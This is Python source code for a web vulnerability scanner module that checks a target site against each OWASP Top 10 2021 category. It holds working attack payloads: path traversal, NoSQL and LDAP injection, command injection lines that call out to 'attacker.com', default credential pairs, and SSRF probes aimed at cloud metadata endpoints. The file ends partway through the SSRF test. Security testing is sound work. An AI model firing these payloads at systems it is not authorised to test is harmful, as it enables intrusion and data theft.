"""
OWASP Top 10 Scanner Module for Astrava AI Security Scanner
Comprehensive testing for all OWASP Top 10 2021 vulnerabilities
"""

import asyncio
import aiohttp
import json
import re
import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse
import logging

from core.config import Config, OWASP_TOP_10
from core.ai_engine import AIEngine

class OWASPScanner:
    """OWASP Top 10 2021 comprehensive scanner"""
    
    def __init__(self, config: Config, logger: logging.Logger, ai_engine: AIEngine):
        self.config = config
        self.logger = logger
        self.ai_engine = ai_engine
        self.target_url = config.target_url
        self.parsed_url = urlparse(config.target_url)
        self.session = None
        
        # Results storage
        self.owasp_results = {}
    
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            connector=aiohttp.TCPConnector(ssl=False)
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def test_owasp_top_10(self) -> Dict[str, Any]:
        """Test all OWASP Top 10 2021 vulnerabilities"""
        self.logger.info("Starting OWASP Top 10 2021 testing...")
        
        async with self:
            # A01:2021 - Broken Access Control
            self.owasp_results['A01_2021'] = await self.test_broken_access_control()
            
            # A02:2021 - Cryptographic Failures
            self.owasp_results['A02_2021'] = await self.test_cryptographic_failures()
            
            # A03:2021 - Injection (already covered in vulnerability scanner)
            self.owasp_results['A03_2021'] = await self.test_injection_comprehensive()
            
            # A04:2021 - Insecure Design
            self.owasp_results['A04_2021'] = await self.test_insecure_design()
            
            # A05:2021 - Security Misconfiguration
            self.owasp_results['A05_2021'] = await self.test_security_misconfiguration()
            
            # A06:2021 - Vulnerable and Outdated Components
            self.owasp_results['A06_2021'] = await self.test_vulnerable_components()
            
            # A07:2021 - Identification and Authentication Failures
            self.owasp_results['A07_2021'] = await self.test_auth_failures()
            
            # A08:2021 - Software and Data Integrity Failures
            self.owasp_results['A08_2021'] = await self.test_integrity_failures()
            
            # A09:2021 - Security Logging and Monitoring Failures
            self.owasp_results['A09_2021'] = await self.test_logging_monitoring()
            
            # A10:2021 - Server-Side Request Forgery
            self.owasp_results['A10_2021'] = await self.test_ssrf_comprehensive()
        
        self.logger.info("OWASP Top 10 testing completed")
        return self.owasp_results
    
    async def test_broken_access_control(self) -> Dict[str, Any]:
        """A01:2021 - Broken Access Control"""
        self.logger.info("Testing A01:2021 - Broken Access Control")
        
        results = {
            'category': 'A01:2021 - Broken Access Control',
            'vulnerabilities': [],
            'tests_performed': []
        }
        
        # Test IDOR (Insecure Direct Object References)
        await self.test_idor(results)
        
        # Test privilege escalation
        await self.test_privilege_escalation(results)
        
        # Test path traversal
        await self.test_path_traversal_comprehensive(results)
        
        # Test forced browsing
        await self.test_forced_browsing(results)
        
        # Test missing access controls
        await self.test_missing_access_controls(results)
        
        return results
    
    async def test_idor(self, results: Dict[str, Any]):
        """Test for Insecure Direct Object References"""
        results['tests_performed'].append('IDOR Testing')
        
        # Common IDOR patterns
        idor_patterns = [
            '?id=1', '?user=1', '?account=1', '?profile=1',
            '?doc=1', '?file=1', '?order=1', '?invoice=1'
        ]
        
        for pattern in idor_patterns:
            try:
                # Test original request
                original_url = f"{self.target_url}{pattern}"
                async with self.session.get(original_url) as response:
                    original_status = response.status
                    original_content = await response.text()
                
                # Test modified ID
                modified_pattern = pattern.replace('=1', '=2')
                modified_url = f"{self.target_url}{modified_pattern}"
                async with self.session.get(modified_url) as response:
                    modified_status = response.status
                    modified_content = await response.text()
                
                # Check if both requests return valid data but different content
                if (original_status == 200 and modified_status == 200 and 
                    len(original_content) > 100 and len(modified_content) > 100 and
                    original_content != modified_content):
                    
                    results['vulnerabilities'].append({
                        'type': 'Insecure Direct Object Reference (IDOR)',
                        'severity': 'High',
                        'evidence': f'Different responses for {pattern} and {modified_pattern}',
                        'url': original_url,
                        'description': 'Application exposes direct object references without proper authorization',
                        'impact': 'Unauthorized access to other users\' data',
                        'cwe': 'CWE-639',
                        'owasp': 'A01:2021 - Broken Access Control'
                    })
            
            except Exception as e:
                continue
    
    async def test_privilege_escalation(self, results: Dict[str, Any]):
        """Test for privilege escalation vulnerabilities"""
        results['tests_performed'].append('Privilege Escalation Testing')
        
        # Test role manipulation
        role_params = [
            'role=admin', 'user_type=administrator', 'level=admin',
            'privilege=admin', 'access=admin', 'group=admin'
        ]
        
        for param in role_params:
            try:
                test_url = f"{self.target_url}?{param}"
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    
                    # Check for admin panel indicators
                    admin_indicators = [
                        'admin panel', 'administration', 'control panel',
                        'user management', 'system settings', 'admin dashboard'
                    ]
                    
                    if any(indicator in response_text.lower() for indicator in admin_indicators):
                        results['vulnerabilities'].append({
                            'type': 'Privilege Escalation',
                            'severity': 'Critical',
                            'evidence': f'Admin panel accessible with parameter: {param}',
                            'url': test_url,
                            'description': 'Application allows privilege escalation through parameter manipulation',
                            'impact': 'Unauthorized administrative access',
                            'cwe': 'CWE-269',
                            'owasp': 'A01:2021 - Broken Access Control'
                        })
            
            except Exception as e:
                continue
    
    async def test_path_traversal_comprehensive(self, results: Dict[str, Any]):
        """Comprehensive path traversal testing"""
        results['tests_performed'].append('Path Traversal Testing')
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        test_params = ['file', 'path', 'page', 'include', 'doc', 'template']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={payload}"
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for file content indicators
                        file_indicators = [
                            'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
                            '[drivers]', '[fonts]', 'windows',  # Windows files
                            '# This file', '# /etc/passwd'  # File headers
                        ]
                        
                        for indicator in file_indicators:
                            if indicator in response_text:
                                results['vulnerabilities'].append({
                                    'type': 'Path Traversal',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'File content detected: {indicator}',
                                    'url': test_url,
                                    'description': f'Path traversal vulnerability in parameter "{param}"',
                                    'impact': 'Unauthorized file system access',
                                    'cwe': 'CWE-22',
                                    'owasp': 'A01:2021 - Broken Access Control'
                                })
                                break
                
                except Exception as e:
                    continue
    
    async def test_forced_browsing(self, results: Dict[str, Any]):
        """Test for forced browsing vulnerabilities"""
        results['tests_performed'].append('Forced Browsing Testing')
        
        # Common admin/sensitive paths
        sensitive_paths = [
            '/admin/', '/administrator/', '/wp-admin/', '/phpmyadmin/',
            '/cpanel/', '/webmail/', '/manager/', '/console/',
            '/dashboard/', '/panel/', '/control/', '/backend/',
            '/api/admin/', '/api/internal/', '/internal/',
            '/test/', '/dev/', '/staging/', '/backup/'
        ]
        
        for path in sensitive_paths:
            try:
                test_url = urljoin(self.target_url, path)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check if it's not just a 404 page
                        if len(response_text) > 500 and '404' not in response_text.lower():
                            results['vulnerabilities'].append({
                                'type': 'Forced Browsing',
                                'severity': 'Medium',
                                'evidence': f'Sensitive path accessible: {path}',
                                'url': test_url,
                                'description': f'Sensitive directory "{path}" is accessible without authentication',
                                'impact': 'Information disclosure, unauthorized access',
                                'cwe': 'CWE-425',
                                'owasp': 'A01:2021 - Broken Access Control'
                            })
            
            except Exception as e:
                continue
    
    async def test_missing_access_controls(self, results: Dict[str, Any]):
        """Test for missing access controls"""
        results['tests_performed'].append('Missing Access Controls Testing')
        
        # This would typically involve testing authenticated vs unauthenticated access
        # For now, we'll check for common indicators
        try:
            async with self.session.get(self.target_url) as response:
                response_text = await response.text()
                
                # Check for exposed admin functionality
                admin_functions = [
                    'delete user', 'create user', 'modify user',
                    'admin functions', 'system configuration',
                    'database access', 'file management'
                ]
                
                for function in admin_functions:
                    if function in response_text.lower():
                        results['vulnerabilities'].append({
                            'type': 'Missing Access Controls',
                            'severity': 'High',
                            'evidence': f'Admin functionality exposed: {function}',
                            'url': self.target_url,
                            'description': 'Administrative functions accessible without proper authorization',
                            'impact': 'Unauthorized administrative operations',
                            'cwe': 'CWE-862',
                            'owasp': 'A01:2021 - Broken Access Control'
                        })
        
        except Exception as e:
            pass
    
    async def test_cryptographic_failures(self) -> Dict[str, Any]:
        """A02:2021 - Cryptographic Failures"""
        self.logger.info("Testing A02:2021 - Cryptographic Failures")
        
        results = {
            'category': 'A02:2021 - Cryptographic Failures',
            'vulnerabilities': [],
            'tests_performed': []
        }
        
        # Test weak encryption
        await self.test_weak_encryption(results)
        
        # Test SSL/TLS configuration
        await self.test_ssl_tls_comprehensive(results)
        
        # Test sensitive data exposure
        await self.test_sensitive_data_exposure(results)
        
        return results
    
    async def test_weak_encryption(self, results: Dict[str, Any]):
        """Test for weak encryption implementations"""
        results['tests_performed'].append('Weak Encryption Testing')
        
        try:
            async with self.session.get(self.target_url) as response:
                response_text = await response.text()
                headers = response.headers
                
                # Check for weak encryption indicators in response
                weak_crypto_indicators = [
                    'md5', 'sha1', 'des', 'rc4', 'base64',
                    'rot13', 'caesar', 'simple'
                ]
                
                for indicator in weak_crypto_indicators:
                    if indicator in response_text.lower():
                        results['vulnerabilities'].append({
                            'type': 'Weak Cryptographic Implementation',
                            'severity': 'Medium',
                            'evidence': f'Weak crypto indicator found: {indicator}',
                            'url': self.target_url,
                            'description': 'Application may be using weak cryptographic algorithms',
                            'impact': 'Data confidentiality compromise',
                            'cwe': 'CWE-327',
                            'owasp': 'A02:2021 - Cryptographic Failures'
                        })
        
        except Exception as e:
            pass
    
    async def test_ssl_tls_comprehensive(self, results: Dict[str, Any]):
        """Comprehensive SSL/TLS testing"""
        results['tests_performed'].append('SSL/TLS Configuration Testing')
        
        if self.parsed_url.scheme != 'https':
            results['vulnerabilities'].append({
                'type': 'Missing HTTPS',
                'severity': 'High',
                'evidence': 'Application not using HTTPS',
                'url': self.target_url,
                'description': 'Application transmits data over unencrypted HTTP',
                'impact': 'Data interception, man-in-the-middle attacks',
                'cwe': 'CWE-319',
                'owasp': 'A02:2021 - Cryptographic Failures'
            })
            return
        
        # Test SSL/TLS configuration
        import ssl
        import socket
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.parsed_url.netloc, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.parsed_url.netloc) as ssock:
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    # Check for weak ciphers
                    if cipher and len(cipher) > 0:
                        cipher_name = cipher[0] if isinstance(cipher, tuple) else str(cipher)
                        weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
                        
                        for weak_cipher in weak_ciphers:
                            if weak_cipher in cipher_name.upper():
                                results['vulnerabilities'].append({
                                    'type': 'Weak SSL/TLS Cipher',
                                    'severity': 'Medium',
                                    'evidence': f'Weak cipher in use: {cipher_name}',
                                    'url': self.target_url,
                                    'description': 'SSL/TLS connection uses weak cryptographic cipher',
                                    'impact': 'Encrypted data may be compromised',
                                    'cwe': 'CWE-327',
                                    'owasp': 'A02:2021 - Cryptographic Failures'
                                })
                    
                    # Check for weak protocols
                    if protocol and protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        results['vulnerabilities'].append({
                            'type': 'Weak SSL/TLS Protocol',
                            'severity': 'High',
                            'evidence': f'Weak protocol in use: {protocol}',
                            'url': self.target_url,
                            'description': 'SSL/TLS connection uses deprecated protocol version',
                            'impact': 'Connection vulnerable to protocol-specific attacks',
                            'cwe': 'CWE-326',
                            'owasp': 'A02:2021 - Cryptographic Failures'
                        })
        
        except Exception as e:
            results['vulnerabilities'].append({
                'type': 'SSL/TLS Configuration Error',
                'severity': 'Medium',
                'evidence': f'SSL/TLS analysis failed: {str(e)}',
                'url': self.target_url,
                'description': 'Unable to analyze SSL/TLS configuration',
                'impact': 'Potential SSL/TLS misconfiguration',
                'cwe': 'CWE-295',
                'owasp': 'A02:2021 - Cryptographic Failures'
            })
    
    async def test_sensitive_data_exposure(self, results: Dict[str, Any]):
        """Test for sensitive data exposure"""
        results['tests_performed'].append('Sensitive Data Exposure Testing')
        
        # Test for exposed sensitive files
        sensitive_files = [
            '.env', 'config.php', 'database.yml', 'secrets.json',
            'private.key', 'id_rsa', 'shadow', 'passwd',
            'web.config', 'app.config', 'settings.py'
        ]
        
        for file_name in sensitive_files:
            try:
                test_url = urljoin(self.target_url, file_name)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for sensitive content
                        sensitive_patterns = [
                            'password', 'secret', 'key', 'token',
                            'api_key', 'private', 'credential'
                        ]
                        
                        if any(pattern in response_text.lower() for pattern in sensitive_patterns):
                            results['vulnerabilities'].append({
                                'type': 'Sensitive Data Exposure',
                                'severity': 'High',
                                'evidence': f'Sensitive file exposed: {file_name}',
                                'url': test_url,
                                'description': f'Sensitive configuration file "{file_name}" is publicly accessible',
                                'impact': 'Credential theft, system compromise',
                                'cwe': 'CWE-200',
                                'owasp': 'A02:2021 - Cryptographic Failures'
                            })
            
            except Exception as e:
                continue
    
    async def test_injection_comprehensive(self) -> Dict[str, Any]:
        """A03:2021 - Injection (comprehensive testing)"""
        self.logger.info("Testing A03:2021 - Injection (Comprehensive)")
        
        results = {
            'category': 'A03:2021 - Injection',
            'vulnerabilities': [],
            'tests_performed': []
        }
        
        # NoSQL Injection testing
        await self.test_nosql_injection(results)
        
        # LDAP Injection testing
        await self.test_ldap_injection(results)
        
        # OS Command Injection (additional tests)
        await self.test_os_command_injection_advanced(results)
        
        return results
    
    async def test_nosql_injection(self, results: Dict[str, Any]):
        """Test for NoSQL injection vulnerabilities"""
        results['tests_performed'].append('NoSQL Injection Testing')
        
        nosql_payloads = [
            "'; return true; var dummy='",
            "' || '1'=='1",
            "' && this.password.match(/.*/) || 'a'=='b",
            "admin' || 'a'=='a' || '",
            "'; return(true); var dum='",
            "1'; return true; var x = '1",
            "'; return(true);//"
        ]
        
        test_params = ['username', 'user', 'email', 'search', 'query', 'filter']
        
        for param in test_params:
            for payload in nosql_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={payload}"
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for NoSQL error messages
                        nosql_errors = [
                            'MongoError', 'CouchDB', 'RethinkDB',
                            'Neo4j', 'Cassandra', 'Redis',
                            'MongoDB', 'DocumentDB'
                        ]
                        
                        for error in nosql_errors:
                            if error in response_text:
                                results['vulnerabilities'].append({
                                    'type': 'NoSQL Injection',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'NoSQL error detected: {error}',
                                    'url': test_url,
                                    'description': f'NoSQL injection vulnerability in parameter "{param}"',
                                    'impact': 'Database compromise, authentication bypass',
                                    'cwe': 'CWE-943',
                                    'owasp': 'A03:2021 - Injection'
                                })
                                break
                
                except Exception as e:
                    continue
    
    async def test_ldap_injection(self, results: Dict[str, Any]):
        """Test for LDAP injection vulnerabilities"""
        results['tests_performed'].append('LDAP Injection Testing')
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))%00",
            "*()|%26'",
            "admin*",
            "admin))(|(cn=*"
        ]
        
        test_params = ['username', 'user', 'login', 'uid', 'cn', 'dn']
        
        for param in test_params:
            for payload in ldap_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={payload}"
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for LDAP error messages
                        ldap_errors = [
                            'Invalid DN syntax', 'LDAP search error',
                            'Bad search filter', 'javax.naming',
                            'LdapException', 'com.sun.jndi.ldap'
                        ]
                        
                        for error in ldap_errors:
                            if error in response_text:
                                results['vulnerabilities'].append({
                                    'type': 'LDAP Injection',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'LDAP error detected: {error}',
                                    'url': test_url,
                                    'description': f'LDAP injection vulnerability in parameter "{param}"',
                                    'impact': 'Authentication bypass, information disclosure',
                                    'cwe': 'CWE-90',
                                    'owasp': 'A03:2021 - Injection'
                                })
                                break
                
                except Exception as e:
                    continue
    
    async def test_os_command_injection_advanced(self, results: Dict[str, Any]):
        """Advanced OS command injection testing"""
        results['tests_performed'].append('Advanced OS Command Injection Testing')
        
        # Advanced command injection payloads
        advanced_payloads = [
            "; curl http://attacker.com/$(whoami)",
            "| nslookup $(whoami).attacker.com",
            "&& wget http://attacker.com/$(id)",
            "; python -c 'import os; os.system(\"whoami\")'",
            "| powershell -c \"whoami\"",
            "; bash -c 'whoami'",
            "&& cmd /c whoami"
        ]
        
        test_params = ['cmd', 'command', 'exec', 'run', 'system', 'shell']
        
        for param in test_params:
            for payload in advanced_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={payload}"
                    
                    start_time = time.time()
                    async with self.session.get(test_url) as response:
                        response_time = time.time() - start_time
                        response_text = await response.text()
                        
                        # Check for command execution indicators
                        execution_indicators = [
                            'uid=', 'gid=', 'groups=',  # Unix id output
                            'nt authority\\system', 'domain\\',  # Windows whoami
                            'PING', 'packets transmitted',  # Network commands
                            'HTTP/1.1', 'curl:', 'wget:'  # HTTP requests
                        ]
                        
                        for indicator in execution_indicators:
                            if indicator.lower() in response_text.lower():
                                results['vulnerabilities'].append({
                                    'type': 'Advanced Command Injection',
                                    'severity': 'Critical',
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': f'Command execution detected: {indicator}',
                                    'url': test_url,
                                    'description': f'Advanced command injection in parameter "{param}"',
                                    'impact': 'Remote code execution, full system compromise',
                                    'cwe': 'CWE-78',
                                    'owasp': 'A03:2021 - Injection'
                                })
                                break
                
                except Exception as e:
                    continue
    
    # Continue with remaining OWASP categories...
    async def test_insecure_design(self) -> Dict[str, Any]:
        """A04:2021 - Insecure Design"""
        self.logger.info("Testing A04:2021 - Insecure Design")
        
        results = {
            'category': 'A04:2021 - Insecure Design',
            'vulnerabilities': [],
            'tests_performed': ['Business Logic Testing', 'Design Flaw Analysis']
        }
        
        # This category requires manual analysis and business logic understanding
        # We'll implement basic checks for common design flaws
        
        try:
            async with self.session.get(self.target_url) as response:
                response_text = await response.text()
                
                # Check for exposed debug information
                debug_indicators = [
                    'debug=true', 'test=1', 'dev=1',
                    'stacktrace', 'exception', 'error trace'
                ]
                
                for indicator in debug_indicators:
                    if indicator.lower() in response_text.lower():
                        results['vulnerabilities'].append({
                            'type': 'Debug Information Exposure',
                            'severity': 'Medium',
                            'evidence': f'Debug indicator found: {indicator}',
                            'url': self.target_url,
                            'description': 'Application exposes debug information',
                            'impact': 'Information disclosure, system reconnaissance',
                            'cwe': 'CWE-209',
                            'owasp': 'A04:2021 - Insecure Design'
                        })
        
        except Exception as e:
            pass
        
        return results
    
    async def test_security_misconfiguration(self) -> Dict[str, Any]:
        """A05:2021 - Security Misconfiguration"""
        self.logger.info("Testing A05:2021 - Security Misconfiguration")
        
        results = {
            'category': 'A05:2021 - Security Misconfiguration',
            'vulnerabilities': [],
            'tests_performed': []
        }
        
        # Test default credentials
        await self.test_default_credentials(results)
        
        # Test unnecessary features
        await self.test_unnecessary_features(results)
        
        # Test error handling
        await self.test_error_handling(results)
        
        # Test security headers (comprehensive)
        await self.test_security_headers_comprehensive(results)
        
        return results
    
    async def test_default_credentials(self, results: Dict[str, Any]):
        """Test for default credentials"""
        results['tests_performed'].append('Default Credentials Testing')
        
        # Common default credentials
        default_creds = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('administrator', 'administrator'), ('root', 'root'),
            ('guest', 'guest'), ('test', 'test'), ('demo', 'demo')
        ]
        
        # This would require finding login forms and testing them
        # For demonstration, we'll check for common admin paths
        admin_paths = ['/admin/', '/administrator/', '/login/', '/signin/']
        
        for path in admin_paths:
            try:
                test_url = urljoin(self.target_url, path)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        if 'login' in response_text.lower() or 'password' in response_text.lower():
                            results['vulnerabilities'].append({
                                'type': 'Default Credentials Risk',
                                'severity': 'Medium',
                                'evidence': f'Login form found at: {path}',
                                'url': test_url,
                                'description': 'Login form detected - test for default credentials',
                                'impact': 'Unauthorized access if default credentials are used',
                                'cwe': 'CWE-521',
                                'owasp': 'A05:2021 - Security Misconfiguration'
                            })
            
            except Exception as e:
                continue
    
    async def test_unnecessary_features(self, results: Dict[str, Any]):
        """Test for unnecessary features enabled"""
        results['tests_performed'].append('Unnecessary Features Testing')
        
        # Test for common unnecessary features
        test_paths = [
            '/phpinfo.php', '/info.php', '/test.php',
            '/server-info', '/server-status',
            '/.git/', '/.svn/', '/.env'
        ]
        
        for path in test_paths:
            try:
                test_url = urljoin(self.target_url, path)
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        results['vulnerabilities'].append({
                            'type': 'Unnecessary Feature Enabled',
                            'severity': 'Medium',
                            'evidence': f'Unnecessary feature accessible: {path}',
                            'url': test_url,
                            'description': f'Unnecessary feature "{path}" is enabled and accessible',
                            'impact': 'Information disclosure, increased attack surface',
                            'cwe': 'CWE-16',
                            'owasp': 'A05:2021 - Security Misconfiguration'
                        })
            
            except Exception as e:
                continue
    
    async def test_error_handling(self, results: Dict[str, Any]):
        """Test error handling configuration"""
        results['tests_performed'].append('Error Handling Testing')
        
        # Generate errors and check responses
        error_payloads = [
            '?error=1', '?debug=1', '?test=invalid',
            '?id=abc', '?page=nonexistent'
        ]
        
        for payload in error_payloads:
            try:
                test_url = f"{self.target_url}{payload}"
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    
                    # Check for verbose error messages
                    error_indicators = [
                        'stack trace', 'exception', 'error in',
                        'warning:', 'notice:', 'fatal error',
                        'mysql_', 'postgresql', 'oracle error'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator.lower() in response_text.lower():
                            results['vulnerabilities'].append({
                                'type': 'Verbose Error Messages',
                                'severity': 'Low',
                                'evidence': f'Verbose error detected: {indicator}',
                                'url': test_url,
                                'description': 'Application exposes detailed error information',
                                'impact': 'Information disclosure, system reconnaissance',
                                'cwe': 'CWE-209',
                                'owasp': 'A05:2021 - Security Misconfiguration'
                            })
                            break
            
            except Exception as e:
                continue
    
    async def test_security_headers_comprehensive(self, results: Dict[str, Any]):
        """Comprehensive security headers testing"""
        results['tests_performed'].append('Security Headers Testing')
        
        try:
            async with self.session.get(self.target_url) as response:
                headers = response.headers
                
                # Required security headers
                required_headers = {
                    'Content-Security-Policy': 'High',
                    'X-Frame-Options': 'Medium',
                    'X-Content-Type-Options': 'Medium',
                    'Strict-Transport-Security': 'High',
                    'Referrer-Policy': 'Low',
                    'Permissions-Policy': 'Low'
                }
                
                missing_headers = []
                for header, severity in required_headers.items():
                    if header not in headers:
                        missing_headers.append((header, severity))
                
                if missing_headers:
                    for header, severity in missing_headers:
                        results['vulnerabilities'].append({
                            'type': 'Missing Security Header',
                            'severity': severity,
                            'evidence': f'Missing security header: {header}',
                            'url': self.target_url,
                            'description': f'Security header "{header}" is not implemented',
                            'impact': 'Increased vulnerability to various attacks',
                            'cwe': 'CWE-16',
                            'owasp': 'A05:2021 - Security Misconfiguration'
                        })
        
        except Exception as e:
            pass
    
    # Implement remaining OWASP categories (A06-A10)...
    async def test_vulnerable_components(self) -> Dict[str, Any]:
        """A06:2021 - Vulnerable and Outdated Components"""
        results = {
            'category': 'A06:2021 - Vulnerable and Outdated Components',
            'vulnerabilities': [],
            'tests_performed': ['Component Analysis', 'Version Detection']
        }
        
        # This would typically involve component analysis
        # For demonstration, we'll check for common indicators
        try:
            async with self.session.get(self.target_url) as response:
                headers = response.headers
                response_text = await response.text()
                
                # Check server version
                server = headers.get('Server', '')
                if server:
                    # Look for version numbers that might indicate outdated software
                    version_patterns = [
                        r'Apache/2\.[0-2]',  # Old Apache versions
                        r'nginx/1\.[0-9]',   # Potentially old nginx
                        r'PHP/[5-7]\.',      # PHP versions
                    ]
                    
                    for pattern in version_patterns:
                        if re.search(pattern, server):
                            results['vulnerabilities'].append({
                                'type': 'Potentially Outdated Component',
                                'severity': 'Medium',
                                'evidence': f'Server header: {server}',
                                'url': self.target_url,
                                'description': 'Server may be running outdated software',
                                'impact': 'Potential security vulnerabilities in outdated components',
                                'cwe': 'CWE-1104',
                                'owasp': 'A06:2021 - Vulnerable and Outdated Components'
                            })
        
        except Exception as e:
            pass
        
        return results
    
    async def test_auth_failures(self) -> Dict[str, Any]:
        """A07:2021 - Identification and Authentication Failures"""
        results = {
            'category': 'A07:2021 - Identification and Authentication Failures',
            'vulnerabilities': [],
            'tests_performed': ['Weak Password Policy', 'Session Management', 'Brute Force Protection']
        }
        
        # Test session management
        try:
            async with self.session.get(self.target_url) as response:
                cookies = response.cookies
                
                for cookie in cookies:
                    # Check cookie security attributes
                    if not cookie.get('secure') and self.parsed_url.scheme == 'https':
                        results['vulnerabilities'].append({
                            'type': 'Insecure Cookie',
                            'severity': 'Medium',
                            'evidence': f'Cookie "{cookie.key}" missing Secure flag',
                            'url': self.target_url,
                            'description': 'Session cookie not marked as secure',
                            'impact': 'Session hijacking via insecure transmission',
                            'cwe': 'CWE-614',
                            'owasp': 'A07:2021 - Identification and Authentication Failures'
                        })
                    
                    if not cookie.get('httponly'):
                        results['vulnerabilities'].append({
                            'type': 'Missing HttpOnly Flag',
                            'severity': 'Medium',
                            'evidence': f'Cookie "{cookie.key}" missing HttpOnly flag',
                            'url': self.target_url,
                            'description': 'Session cookie accessible via JavaScript',
                            'impact': 'Session hijacking via XSS',
                            'cwe': 'CWE-1004',
                            'owasp': 'A07:2021 - Identification and Authentication Failures'
                        })
        
        except Exception as e:
            pass
        
        return results
    
    async def test_integrity_failures(self) -> Dict[str, Any]:
        """A08:2021 - Software and Data Integrity Failures"""
        results = {
            'category': 'A08:2021 - Software and Data Integrity Failures',
            'vulnerabilities': [],
            'tests_performed': ['Deserialization Testing', 'Supply Chain Analysis']
        }
        
        # Test for deserialization vulnerabilities
        deserialization_payloads = [
            'O:8:"stdClass":0:{}',  # PHP
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',  # Java
            'BNVzdGQAAAAAAAAAAAEAAAABAAAABHRlc3Q=',  # .NET
        ]
        
        for payload in deserialization_payloads:
            try:
                # Test in various parameters
                test_params = ['data', 'object', 'serialized', 'payload']
                for param in test_params:
                    test_url = f"{self.target_url}?{param}={payload}"
                    async with self.session.get(test_url) as response:
                        response_text = await response.text()
                        
                        # Check for deserialization errors
                        deser_errors = [
                            'unserialize', 'ObjectInputStream',
                            'BinaryFormatter', 'pickle.loads'
                        ]
                        
                        for error in deser_errors:
                            if error in response_text:
                                results['vulnerabilities'].append({
                                    'type': 'Deserialization Vulnerability',
                                    'severity': 'High',
                                    'evidence': f'Deserialization error: {error}',
                                    'url': test_url,
                                    'description': 'Application may be vulnerable to deserialization attacks',
                                    'impact': 'Remote code execution, data tampering',
                                    'cwe': 'CWE-502',
                                    'owasp': 'A08:2021 - Software and Data Integrity Failures'
                                })
                                break
            
            except Exception as e:
                continue
        
        return results
    
    async def test_logging_monitoring(self) -> Dict[str, Any]:
        """A09:2021 - Security Logging and Monitoring Failures"""
        results = {
            'category': 'A09:2021 - Security Logging and Monitoring Failures',
            'vulnerabilities': [],
            'tests_performed': ['Logging Analysis', 'Monitoring Gaps']
        }
        
        # This category is difficult to test automatically
        # We'll check for basic indicators
        try:
            # Test if application logs security events
            # This would require multiple requests and analysis
            results['vulnerabilities'].append({
                'type': 'Logging Assessment Required',
                'severity': 'Info',
                'evidence': 'Manual assessment required for logging and monitoring',
                'url': self.target_url,
                'description': 'Security logging and monitoring capabilities require manual assessment',
                'impact': 'Inability to detect and respond to security incidents',
                'cwe': 'CWE-778',
                'owasp': 'A09:2021 - Security Logging and Monitoring Failures'
            })
        
        except Exception as e:
            pass
        
        return results
    
    async def test_ssrf_comprehensive(self) -> Dict[str, Any]:
        """A10:2021 - Server-Side Request Forgery (Comprehensive)"""
        results = {
            'category': 'A10:2021 - Server-Side Request Forgery',
            'vulnerabilities': [],
            'tests_performed': ['SSRF Detection', 'Internal Services', 'Cloud Metadata']
        }
        
        # Generate AI-powered SSRF payloads
        target_info = {
            'url': self.target_url,
            'cloud_provider': 'Unknown',
            'internal_networks': ['127.0.0.1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']
        }
        
        ai_payloads = await self.ai_engine.generate_ssrf_payloads(target_info)
        
        # Comprehensive SSRF payloads
        comprehensive_payloads = [
            # Localhost variations
            'http://127.0.0.1:80', 'http://localhost:22', 'http://0.0.0.0:80',
            'http://[::1]:80', 'http://127.1:80', 'http://127.0.1:80',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/instance',  # Azure
            
            # Protocol variations
            'file:///etc/passwd', 'gopher://127.0.0.1:25/',
            'dict://127.0.0.1:11211/', 'ftp://127.0.0.1/',
            
            # Bypass techniques
            'http://127.0.0.1.xip.io/', 'http://127.0.0.1.nip.io/',
            'http://0x7f000001/', 'http://2130706433/',
        ] + ai_payloads
        
        test_params = ['url', 'uri', 'link', 'src', 'target', 'redirect', 'proxy', 'fetch']
        
        for param in test_params:
            for payload in comprehensive_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={payload}"
                    
                    start_time = time.time()
